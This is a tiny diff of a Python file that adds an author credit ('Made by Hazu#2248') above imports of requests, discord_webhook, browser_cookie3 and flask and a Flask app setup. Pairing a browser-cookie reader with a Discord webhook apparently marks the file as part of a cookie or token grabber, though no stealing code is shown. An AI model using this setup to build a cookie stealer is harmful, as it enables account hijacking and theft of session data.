@@ -1,3 +1,4 @@
+#Made by Hazu#2248
 import requests, discord_webhook, browser_cookie3, flask
 
 app = flask.Flask(__name__, template_folder="templates", static_folder="static")
